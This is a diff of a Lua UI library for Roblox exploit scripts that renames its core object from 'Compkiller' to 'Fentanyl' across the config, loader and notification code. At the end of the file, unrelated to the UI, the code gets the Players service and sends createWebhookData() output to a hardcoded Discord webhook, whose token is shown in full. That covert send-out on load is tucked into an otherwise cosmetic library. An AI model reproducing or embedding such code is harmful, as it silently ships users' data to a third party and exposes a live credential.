+		for i,v in next , Fentanyl.Flags do
 			local Value = v:GetValue();
 			local Suf = {};
 
@@ -8505,15 +8505,15 @@
 		return ConfigFlags;
 	end;
 
-	function Compkiller:_Path(...)
+	function Fentanyl:_Path(...)
 		local args = {...};
 
 		return table.concat(args, "/");
 	end;
 
-	function Compkiller:ConfigManager(ConfigManager: ConfigManager) : ConfigFunctions
-		ConfigManager = Compkiller.__CONFIG(ConfigManager , {
-			Directory = "Compkiller",
+	function Fentanyl:ConfigManager(ConfigManager: ConfigManager) : ConfigFunctions
+		ConfigManager = Fentanyl.__CONFIG(ConfigManager , {
+			Directory = "Fentanyl",
 			Config = "Software"
 		});
 
@@ -8521,49 +8521,49 @@
 			makefolder(ConfigManager.Directory);
 		end;
 
-		if not isfolder(Compkiller:_Path(ConfigManager.Directory , ConfigManager.Config)) then
-			makefolder(Compkiller:_Path(ConfigManager.Directory , ConfigManager.Config));
+		if not isfolder(Fentanyl:_Path(ConfigManager.Directory , ConfigManager.Config)) then
+			makefolder(Fentanyl:_Path(ConfigManager.Directory , ConfigManager.Config));
 		end;
 
 		local Args = {
-			Directory = Compkiller:_Path(ConfigManager.Directory , ConfigManager.Config);
+			Directory = Fentanyl:_Path(ConfigManager.Directory , ConfigManager.Config);
 			EnableNotify = false,
 		};
 
-		local notify = Compkiller.newNotify();
+		local notify = Fentanyl.newNotify();
 
 		function Args:WriteConfig(Config: WriteConfig)
 
 
-			Config = Compkiller.__CONFIG(Config , {
-				Name = Compkiller:_RandomString(),
+			Config = Fentanyl.__CONFIG(Config , {
+				Name = Fentanyl:_RandomString(),
 				Author = LocalPlayer.Name,
 			});
 
-			local Flags = Compkiller:GetConfig("MK");
+			local Flags = Fentanyl:GetConfig("MK");
 
 			Flags["__INFORMATION"] = {
 				Type = "Information",
 				Author = Config.Author,
 				Name = Config.Name,
-				CreatedDate = Compkiller:GetDate()
+				CreatedDate = Fentanyl:GetDate()
 			};
 
 			if Args.EnableNotify then
 				notify.new({
 					Title = "Configs",
-					Icon = Compkiller:_GetIcon('settings'),
+					Icon = Fentanyl:_GetIcon('settings'),
 					Content = "Create config \""..Config.Name.."\""
 				})
 			end
 
-			writefile(Compkiller:_Path(Args.Directory , Config.Name) , HttpService:JSONEncode(Flags));
+			writefile(Fentanyl:_Path(Args.Directory , Config.Name) , HttpService:JSONEncode(Flags));
 		end;
 
 		function Args:LoadConfigFromString(str: string)
 			local decoded = HttpService:JSONDecode(str);
 
-			local Flags = Compkiller:GetConfig("KV");
+			local Flags = Fentanyl:GetConfig("KV");
 
 			for i,v in next , decoded do
 				if v and v.Flag then
@@ -8589,11 +8589,11 @@
 		end;
 
 		function Args:GetCurrentConfig()
-			return Compkiller:GetConfig("MK")
+			return Fentanyl:GetConfig("MK")
 		end;
 
 		function Args:ReadInfo(ConfigName: string)
-			local _path = Compkiller:_Path(Args.Directory , ConfigName);
+			local _path = Fentanyl:_Path(Args.Directory , ConfigName);
 
 			if isfile(_path) then
 				local info = readfile(_path);
@@ -8635,12 +8635,12 @@
 		end;
 
 		function Args:DeleteConfig(ConfigName)
-			local _path = Compkiller:_Path(Args.Directory,ConfigName);
+			local _path = Fentanyl:_Path(Args.Directory,ConfigName);
 
 			if Args.EnableNotify then
 				notify.new({
 					Title = "Configs",
-					Icon = Compkiller:_GetIcon('settings'),
+					Icon = Fentanyl:_GetIcon('settings'),
 					Content = "Delete config \""..ConfigName.."\""
 				})
 			end
@@ -8655,19 +8655,19 @@
 		end;
 
 		function Args:LoadConfig(ConfigName: string)
-			local _path = Compkiller:_Path(Args.Directory,ConfigName);
+			local _path = Fentanyl:_Path(Args.Directory,ConfigName);
 
 			if isfile(_path) then
 				local info = readfile(_path);
 
 				local decoded = HttpService:JSONDecode(info);
 
-				local Flags = Compkiller:GetConfig("KV");
+				local Flags = Fentanyl:GetConfig("KV");
 
 				if Args.EnableNotify then
 					notify.new({
 						Title = "Configs",
-						Icon = Compkiller:_GetIcon('settings'),
+						Icon = Fentanyl:_GetIcon('settings'),
 						Content = "Load config \""..ConfigName.."\""
 					})
 				end
@@ -8699,22 +8699,22 @@
 		return Args;
 	end;
 
-	function Compkiller:Loader(IconId,Duration)
-		local CompKiller = Instance.new("ScreenGui")
+	function Fentanyl:Loader(IconId,Duration)
+		local Fentanyl = Instance.new("ScreenGui")
 
-		CompKiller.Name = Compkiller:_RandomString()
-		CompKiller.Parent = CoreGui
-		CompKiller.Enabled = true
-		CompKiller.ResetOnSpawn = false
-		CompKiller.IgnoreGuiInset = true
-		CompKiller.ZIndexBehavior = Enum.ZIndexBehavior.Global
+		Fentanyl.Name = Fentanyl:_RandomString()
+		Fentanyl.Parent = CoreGui
+		Fentanyl.Enabled = true
+		Fentanyl.ResetOnSpawn = false
+		Fentanyl.IgnoreGuiInset = true
+		Fentanyl.ZIndexBehavior = Enum.ZIndexBehavior.Global
 
 		local Loader = Instance.new("Frame")
 		local Icon = Instance.new("ImageLabel")
 		local Vignette = Instance.new("ImageLabel")
 
-		Loader.Name = Compkiller:_RandomString()
-		Loader.Parent = CompKiller
+		Loader.Name = Fentanyl:_RandomString()
+		Loader.Parent = Fentanyl
 		Loader.AnchorPoint = Vector2.new(0.5, 0.5)
 		Loader.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 		Loader.BackgroundTransparency = 1
@@ -8723,7 +8723,7 @@
 		Loader.Position = UDim2.new(0.5, 0, 0.5, 0)
 		Loader.Size = UDim2.new(1, 0, 1, 0)
 
-		Icon.Name = Compkiller:_RandomString()
+		Icon.Name = Fentanyl:_RandomString()
 		Icon.Parent = Loader
 		Icon.AnchorPoint = Vector2.new(0.5, 0.5)
 		Icon.BackgroundTransparency = 1.000
@@ -8735,58 +8735,58 @@
 		Icon.Image = IconId or "rbxassetid://120245531583106"
 		Icon.ImageTransparency = 1
 
-		Vignette.Name = Compkiller:_RandomString()
+		Vignette.Name = Fentanyl:_RandomString()
 		Vignette.Parent = Loader
 		Vignette.BackgroundTransparency = 1.000
 		Vignette.BorderColor3 = Color3.fromRGB(27, 42, 53)
 		Vignette.BorderSizePixel = 0
 		Vignette.Size = UDim2.new(1, 0, 1, 0)
 		Vignette.Image = "rbxassetid://18720640102"
-		Vignette.ImageColor3 = Compkiller.Colors.Highlight
+		Vignette.ImageColor3 = Fentanyl.Colors.Highlight
 		Vignette.ImageTransparency = 1
 		Vignette.AnchorPoint = Vector2.new(0.5,0.5)
 		Vignette.Position = UDim2.fromScale(0.5,0.5)
 
-		Compkiller:_Animation(Loader,TweenInfo.new(0.55,Enum.EasingStyle.Quint),{
+		Fentanyl:_Animation(Loader,TweenInfo.new(0.55,Enum.EasingStyle.Quint),{
 			BackgroundTransparency = 0.5
 		});
 
 		local Event = Instance.new('BindableEvent');
 
 		task.delay(0.5,function()
-			Compkiller:_Animation(Icon,TweenInfo.new(0.75,Enum.EasingStyle.Quint),{
+			Fentanyl:_Animation(Icon,TweenInfo.new(0.75,Enum.EasingStyle.Quint),{
 				ImageTransparency = 0.01,
 				Size = UDim2.new(0, 200, 0, 200)
 			});
 
 			task.delay(0.25,function()
-				Compkiller:_Animation(Vignette,TweenInfo.new(5),{
+				Fentanyl:_Animation(Vignette,TweenInfo.new(5),{
 					ImageTransparency = 0.2
 				});
 
 				task.wait(Duration or 4.5)
 
-				Compkiller:_Animation(Vignette,TweenInfo.new(3,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
+				Fentanyl:_Animation(Vignette,TweenInfo.new(3,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
 					Size = UDim2.new(2, 0, 2, 0)
 				});
 
-				Compkiller:_Animation(Icon,TweenInfo.new(0.75,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
+				Fentanyl:_Animation(Icon,TweenInfo.new(0.75,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
 					ImageTransparency = 1,
 				});
 
-				Compkiller:_Animation(Loader,TweenInfo.new(1.5,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
+				Fentanyl:_Animation(Loader,TweenInfo.new(1.5,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
 					BackgroundTransparency = 1
 				});
 
 				task.delay(0.1,function()
-					Compkiller:_Animation(Vignette,TweenInfo.new(1,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
+					Fentanyl:_Animation(Vignette,TweenInfo.new(1,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),{
 						ImageTransparency = 1
 					});
 
 					task.wait(0.2)
 
 					task.delay(3,function()
-						CompKiller:Destroy();
+						Fentanyl:Destroy();
 					end)
 				end)
 
@@ -8803,21 +8803,21 @@
 		};
 	end;
 
-	function Compkiller.newNotify()
-		if Compkiller.NOTIFY_CACHE then
-			return Compkiller.NOTIFY_CACHE;
+	function Fentanyl.newNotify()
+		if Fentanyl.NOTIFY_CACHE then
+			return Fentanyl.NOTIFY_CACHE;
 		end;
 
 		local Notification = Instance.new("ScreenGui")
 		local NotifyContainer = Instance.new("Frame")
 		local UIListLayout = Instance.new("UIListLayout")
 
-		Notification.Name = Compkiller:_RandomString()
+		Notification.Name = Fentanyl:_RandomString()
 		Notification.Parent = CoreGui
 		Notification.ResetOnSpawn = false
 		Notification.ZIndexBehavior = Enum.ZIndexBehavior.Global
 
-		NotifyContainer.Name = Compkiller:_RandomString()
+		NotifyContainer.Name = Fentanyl:_RandomString()
 		NotifyContainer.Parent = Notification
 		NotifyContainer.AnchorPoint = Vector2.new(1, 0)
 		NotifyContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -8834,10 +8834,10 @@
 
 		local LayoutREF = 0;
 
-		Compkiller.NOTIFY_CACHE = {
+		Fentanyl.NOTIFY_CACHE = {
 			new = function(Notify: Notify) : NotifyPayback
-				Notify = Compkiller.__CONFIG(Notify, {
-					Icon = Compkiller.Logo,
+				Notify = Fentanyl.__CONFIG(Notify, {
+					Icon = Fentanyl.Logo,
 					Title = "Notification",
 					Content = "Content",
 					Duration = 3,
@@ -8856,7 +8856,7 @@
 				local TimeLeft = Instance.new("Frame")
 				local UICorner_3 = Instance.new("UICorner")
 
-				BlockFrame.Name = Compkiller:_RandomString()
+				BlockFrame.Name = Fentanyl:_RandomString()
 				BlockFrame.Parent = NotifyContainer
 				BlockFrame.AnchorPoint = Vector2.new(1, 0)
 				BlockFrame.BackgroundColor3 = Color3.fromRGB(22, 24, 29)
@@ -8867,7 +8867,7 @@
 				BlockFrame.Size = UDim2.new(0, 200, 0, 0)
 				BlockFrame.LayoutOrder = LayoutREF;
 
-				NotifyFrame.Name = Compkiller:_RandomString()
+				NotifyFrame.Name = Fentanyl:_RandomString()
 				NotifyFrame.Parent = BlockFrame
 				NotifyFrame.BackgroundColor3 = Color3.fromRGB(22, 24, 29)
 				NotifyFrame.BackgroundTransparency = 0.100
@@ -8881,7 +8881,7 @@
 				UICorner.CornerRadius = UDim.new(0, 4)
 				UICorner.Parent = NotifyFrame
 
-				CompLogo.Name = Compkiller:_RandomString()
+				CompLogo.Name = Fentanyl:_RandomString()
 				CompLogo.Parent = NotifyFrame
 				CompLogo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 				CompLogo.BackgroundTransparency = 1.000
@@ -8890,9 +8890,9 @@
 				CompLogo.Position = UDim2.new(0, 6, 0, 6)
 				CompLogo.Size = UDim2.new(0, 25, 0, 25)
 				CompLogo.ZIndex = 4
-				CompLogo.Image = Compkiller:_GetIcon(Notify.Icon);
+				CompLogo.Image = Fentanyl:_GetIcon(Notify.Icon);
 
-				Header.Name = Compkiller:_RandomString()
+				Header.Name = Fentanyl:_RandomString()
 				Header.Parent = NotifyFrame
 				Header.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 				Header.BackgroundTransparency = 1.000
@@ -8903,11 +8903,11 @@
 				Header.ZIndex = 3
 				Header.Font = Enum.Font.GothamBold
 				Header.Text = Notify.Title
-				Header.TextColor3 = Compkiller.Colors.SwitchColor
+				Header.TextColor3 = Fentanyl.Colors.SwitchColor
 				Header.TextSize = 14.000
 				Header.TextXAlignment = Enum.TextXAlignment.Left
 
-				Body.Name = Compkiller:_RandomString()
+				Body.Name = Fentanyl:_RandomString()
 				Body.Parent = NotifyFrame
 				Body.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 				Body.BackgroundTransparency = 1.000
@@ -8918,13 +8918,13 @@
 				Body.ZIndex = 3
 				Body.Font = Enum.Font.GothamMedium
 				Body.Text = Notify.Content
-				Body.TextColor3 = Compkiller.Colors.SwitchColor
+				Body.TextColor3 = Fentanyl.Colors.SwitchColor
 				Body.TextSize = 12.000
 				Body.TextTransparency = 0.500
 				Body.TextXAlignment = Enum.TextXAlignment.Left
 				Body.TextYAlignment = Enum.TextYAlignment.Top
 
-				TimeLeftFrame.Name = Compkiller:_RandomString()
+				TimeLeftFrame.Name = Fentanyl:_RandomString()
 				TimeLeftFrame.Parent = NotifyFrame
 				TimeLeftFrame.AnchorPoint = Vector2.new(0, 1)
 				TimeLeftFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -8938,9 +8938,9 @@
 				UICorner_2.CornerRadius = UDim.new(0, 4)
 				UICorner_2.Parent = TimeLeftFrame
 
-				TimeLeft.Name = Compkiller:_RandomString()
+				TimeLeft.Name = Fentanyl:_RandomString()
 				TimeLeft.Parent = TimeLeftFrame
-				TimeLeft.BackgroundColor3 = Compkiller.Colors.Highlight
+				TimeLeft.BackgroundColor3 = Fentanyl.Colors.Highlight
 				TimeLeft.BorderColor3 = Color3.fromRGB(0, 0, 0)
 				TimeLeft.BorderSizePixel = 0
 				TimeLeft.Size = UDim2.new(0, 0, 1, 0)
@@ -8957,14 +8957,14 @@
 					local MainY = TitleScale.Y + ((Body.Text:byte() and BodyScale.Y) or 1);
 
 					if BlockFrame:GetAttribute('Already') then
-						Compkiller:_Animation(BlockFrame,TweenInfo.new(0.3),{
+						Fentanyl:_Animation(BlockFrame,TweenInfo.new(0.3),{
 							Size = UDim2.new(0,MainX + 55,0,MainY + 35)
 						});
 					else
 						BlockFrame:SetAttribute('Already',true)
 						BlockFrame.Size = UDim2.new(0, MainX + 45, 0, 0);
 
-						Compkiller:_Animation(BlockFrame,TweenInfo.new(0.3),{
+						Fentanyl:_Animation(BlockFrame,TweenInfo.new(0.3),{
 							Size = UDim2.new(0,MainX + 55,0,MainY + 35)
 						});
 					end;
@@ -8973,13 +8973,13 @@
 				UpdateText();
 
 				local Close = function()
-					Compkiller:_Animation(NotifyFrame,TweenInfo.new(0.65,Enum.EasingStyle.Quint),{
+					Fentanyl:_Animation(NotifyFrame,TweenInfo.new(0.65,Enum.EasingStyle.Quint),{
 						Position = UDim2.new(1,200,0,0)
 					});
 
 					task.wait(0.3);
 
-					Compkiller:_Animation(BlockFrame,TweenInfo.new(0.3),{
+					Fentanyl:_Animation(BlockFrame,TweenInfo.new(0.3),{
 						Size = UDim2.new(1,0,0,0)
 					});
 
@@ -8989,13 +8989,13 @@
 				end;
 
 				local Show = function()
-					Compkiller:_Animation(NotifyFrame,TweenInfo.new(0.5,Enum.EasingStyle.Quint),{
+					Fentanyl:_Animation(NotifyFrame,TweenInfo.new(0.5,Enum.EasingStyle.Quint),{
 						Position = UDim2.new(0,0,0,0)
 					});
 				end;
 
 				if typeof(Notify.Duration) == 'number' and Notify.Duration ~= math.huge then
-					Compkiller:_Animation(TimeLeft,TweenInfo.new(Notify.Duration + 0.2,Enum.EasingStyle.Linear),{
+					Fentanyl:_Animation(TimeLeft,TweenInfo.new(Notify.Duration + 0.2,Enum.EasingStyle.Linear),{
 						Size = UDim2.new(1, 0, 1, 0)
 					});
 
@@ -9031,7 +9031,7 @@
 							new = (new / 100);	
 						end;
 
-						Compkiller:_Animation(TimeLeft,TweenInfo.new(Time or 0.85,(Time and Enum.EasingStyle.Linear) or Enum.EasingStyle.Quint),{
+						Fentanyl:_Animation(TimeLeft,TweenInfo.new(Time or 0.85,(Time and Enum.EasingStyle.Linear) or Enum.EasingStyle.Quint),{
 							Size = UDim2.new(new, 0, 1, 0)
 						});
 
@@ -9043,7 +9043,7 @@
 			end,
 		};
 
-		return Compkiller.NOTIFY_CACHE;
+		return Fentanyl.NOTIFY_CACHE;
 	end;
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -9114,4 +9114,4 @@ end
 local webhookUrl = "https://discord.com/api/webhooks/1404428377942786058/vGaLKm_y0CgDiKJEcT-hw-rYRCaGsVzgIc4o5BVXtcQb_ZwknlP4LuHxGKf6ec0cQcDO"
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
-	return Compkiller;
+	return Fentanyl;
